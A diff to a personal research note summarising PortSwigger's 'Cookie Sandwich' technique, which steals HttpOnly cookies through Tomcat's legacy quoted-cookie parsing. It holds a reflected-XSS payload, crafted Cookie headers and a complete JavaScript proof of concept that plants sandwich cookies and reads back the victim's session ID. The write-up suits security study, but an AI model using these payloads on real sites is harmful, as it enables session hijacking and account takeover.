@@ -1,13 +1,190 @@
 ---
-author: "PortSwigger Research"
-aliases: ["Stealing HttpOnly Cookies With the Cookie Sandwich Technique"]
-tags: [RW_inbox, readwise/articles]
+author: PortSwigger Research
+aliases:
+  - Stealing HttpOnly Cookies With the Cookie Sandwich Technique
+tags:
+  - readwise/articles
 url: https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique
-date: 2025-01-22
+created: 2025-01-22
 ---
 # Stealing HttpOnly Cookies With the Cookie Sandwich Technique
 
 ![rw-book-cover](https://portswigger.net/cms/images/38/f5/ffaa-twittercard-tweetstststs.png)
+
+The [HttpOnly Cookie Attribute](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/HttpOnly%20Cookie%20Attribute.md) is a fundamental security defense designed to prevent client-side scripts (JavaScript) from accessing sensitive cookies, such as session identifiers. However, [Parser differentials](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Confusion%20Attacks.md) between browsers and web servers can sometimes be exploited to bypass this protection.
+
+This technique is known as the **Cookie Sandwich**.
+
+## The Concept
+
+>[!tldr]
+>The core of this attack relies on manipulating how web servers parse the `Cookie` header when special characters—specifically double quotes (`"`)—are involved.
+
+Standard HTTP cookie parsing delimits cookies using semicolons (`;`). However, some servers (such as those strictly adhering to legacy RFCs or specific implementations like Apache #Tomcat) treat content enclosed in double quotes as a single value, even if it contains semicolons.
+
+By "sandwiching" a sensitive `HttpOnly` cookie between two attacker-controlled cookies that use opening and closing quotes, the server can be tricked into interpreting the sensitive cookie as merely part of the attacker's cookie value.
+
+### The Anatomy of a Sandwich
+
+1. **Top Bun:** An attacker-set cookie starting with a quote: `param1="start`
+    
+2. **The Meat (Target):** The browser automatically inserts the victim's cookie: `sessionId=secret`
+    
+3. **Bottom Bun:** An attacker-set cookie closing the quote: `param2=end"`
+    
+
+When sent to the server, the header looks like this:
+
+`Cookie: param1="start; sessionId=secret; param2=end"`
+
+**The Misinterpretation:** While the browser sees three distinct cookies, a vulnerable server parses this as a **single cookie** named `param1` with the value `"start; sessionId=secret; param2=end"`. If the application reflects the value of `param1` back to the user (e.g., in a JSON response or error message), the attacker can read the `sessionId` via JavaScript, effectively bypassing the `HttpOnly` flag.
+
+---
+
+## Technical Prerequisites: The `$Version` Quirk
+
+Modern browsers and servers often default to RFC 6265, which is stricter about quoting. However, specific environments, particularly **Apache Tomcat**, can be forced into a legacy parsing mode (RFC 2109) using a specific trigger.
+
+- **The Trigger:** The `$Version=1` cookie.
+    
+- **The Effect:** When [tomcat](tomcat) sees `$Version=1`, it switches parsing rules. It acknowledges quoted strings and ignores the semicolons inside them, enabling the sandwich attack.
+
+### Controlling Cookie Order
+
+For the sandwich to work, the "Top Bun" must appear _before_ the target cookie in the HTTP header. Browsers generally order cookies based on:
+
+1. **Path length:** Longer, more specific paths are sent first.
+    
+2. **Creation time:** Older cookies are sometimes sent first.
+    
+
+Attackers often manipulate the `Path` attribute or creation time to ensure their malicious cookie (`param1`) precedes the victim's session cookie.
+
+---
+
+## Real-World Case Study
+
+This example demonstrates an attack chain involving a Reflected [XSS](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Cross-Site%20Scripting%20(XSS).md) vulnerability and a cookie reflection endpoint.
+### Step 1: Identifying the Entry Point (XSS)
+
+The attacker identifies a vulnerable page reflecting link attributes without escaping.
+
+**Payload:**
+
+```html
+<link rel="canonical" 
+      oncontentvisibilityautostatechange="alert(1)" 
+      style="content-visibility:auto">
+```
+
+This XSS allows the attacker to execute JavaScript in the victim's browser, which is necessary to set the "sandwich" cookies.
+
+### Step 2: Locating the Reflection
+
+The attacker finds a tracking endpoint (e.g., `tracking.example.com/json`) that:
+
+1. **Reflects a cookie value** (`session`) in its JSON response body.
+    
+2. **Allows [Cross-origin resource sharing (CORS)](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Cross-origin%20resource%20sharing%20(CORS).md)** from the vulnerable domain.
+    
+
+**Normal Request:**
+
+```http
+GET /json?session=ignored HTTP/1.1
+Cookie: session=deadbeef;
+```
+
+**Response:**
+
+```json
+{"session":"deadbeef"}
+```
+
+### Step 3: Executing the Sandwich
+
+The attacker's JavaScript (running via the XSS from Step 1) performs the following operations:
+
+1. **Force Legacy Mode:** Sets `$Version=1`.
+    
+2. **Set Top Bun:** Sets `session="deadbeef`.
+    
+    - _Note:_ The path is set specifically to ensure this cookie is sent _before_ the target `PHPSESSID`.
+        
+3. **Set Bottom Bun:** Sets `dummy=qaz"`.
+    
+4. **Fetch:** Sends a request to the tracking endpoint.
+    
+
+**The Malicious Request Header:**
+
+```HTTP
+GET /json?session=ignored HTTP/1.1
+Cookie: $Version=1; session="deadbeef; PHPSESSID=secret; dummy=qaz"
+```
+
+**The Vulnerable Server Response:** Because the server interprets everything inside the quotes as the `session` value, it reflects the sensitive `PHPSESSID` in the JSON body:
+
+```json
+{"session":"deadbeef; PHPSESSID=secret; dummy=qaz"}
+```
+
+The attacker's script then reads this response text and exfiltrates the `PHPSESSID`.
+
+---
+
+## Proof of Concept Code
+
+The following JavaScript demonstrates the full attack flow. It creates an iframe to target the tracking domain, manipulates the cookies, and executes the sandwich.
+
+
+```js
+async function sandwich(target, cookieName) {
+    // 1. Setup target details
+    const url = new URL(target);
+    const domain = url.hostname;
+    const path = url.pathname;
+
+    // 2. Create an iframe to establish context
+    const iframe = document.createElement('iframe');
+    iframe.src = target;
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+
+    iframe.onload = async () => {
+        // 3. Create the Cookie Sandwich
+        // Top Bun: Triggers RFC2109 ($Version) and opens the quote
+        document.cookie = `$Version=1; domain=${domain}; path=${path};`;
+        document.cookie = `${cookieName}="deadbeef; domain=${domain}; path=${path};`;
+        
+        // Bottom Bun: Closes the quote
+        // Note: Using a root path or different path often helps position this last
+        document.cookie = `dummy=qaz"; domain=${domain}; path=/;`;
+
+        // 4. Send the request (The sandwich is served)
+        try {
+            const response = await fetch(target, {
+                credentials: 'include', // Essential to send cookies
+            });
+            
+            // 5. Exfiltrate data
+            const responseData = await response.text();
+            
+            // In a real attack, this would send data to the attacker's server
+            console.log('Stolen Cookie Data:', responseData);
+            alert(responseData); 
+        } catch (error) {
+            console.error('Error executing sandwich:', error);
+        }
+    };
+}
+
+// Execute the attack
+setTimeout(sandwich, 100, 'http://tracking.example.com/json', 'session');
+```
+
+---
+
 
 ## Highlights
 
